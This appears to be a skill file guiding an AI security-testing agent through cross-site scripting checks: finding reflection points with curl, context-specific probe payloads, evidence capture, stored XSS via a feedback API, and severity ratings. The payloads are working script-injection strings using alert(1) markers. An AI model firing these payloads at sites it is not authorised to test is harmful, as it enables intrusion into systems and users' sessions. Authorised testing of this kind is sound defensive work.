---
name: xss
description: Cross-site scripting testing — reflected, stored, and DOM-based
---

# Cross-Site Scripting (CWE-79)

## 1. Map reflection points

For each param, note WHERE user input reappears (body, attribute, JS string,
HTML comment):

```bash
curl -s "<target>/search?q=zxqj1234" | grep -n zxqj1234
```

The context decides the payload. Probe with a unique marker first — never
blind-fire payloads.

## 2. Probe by context

| Context | Probe |
| --- | --- |
| HTML body | `<b>zxqj1</b>` (does HTML survive?) then `<script>alert(1)</script>` |
| Tag attribute | `"><script>alert(1)</script>` or break out with `" autofocus onfocus=alert(1) x="` |
| JS string | `';alert(1);//` or `"-alert(1)-"` |
| URL param rendered as href | `javascript:alert(1)` |

If angle brackets/quotes get encoded, test what the filter actually blocks
(`<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`) — one variant per
request, watch what survives in the response.

## 3. Confirm executable context

A finding requires the payload landing in the page UNESCAPED in a spot the
browser executes. Evidence must show:

1. The request with the payload.
2. The response line where the payload appears raw (`grep -n` output).
3. If DOM-based (sink in JS, e.g. `innerHTML = location.hash`), show the
   source line from fetched JS proving the sink, and give the victim URL
   (`<target>/#/<img src=x onerror=alert(1)>`).

Use `curl -s <url> | grep -n -C2 'onerror\|alert'` to capture evidence.

## 4. Stored XSS

Find inputs that persist and render later (profile fields, feedback/comments):

1. Post payload: `curl -s -X POST <target>/api/Feedback -H 'Content-Type: application/json' -d '{"comment":"<img src=x onerror=alert(1)>","rating":5}'`
2. Fetch the page/API that renders it back and grep for the raw payload.

## Severity guide

Reflected in search (needs click) → usually medium/high. Stored → high.
DOM-based → medium/high. Only report `<b>`-style HTML injection as low or
merge it into a broader input-sanitization finding.
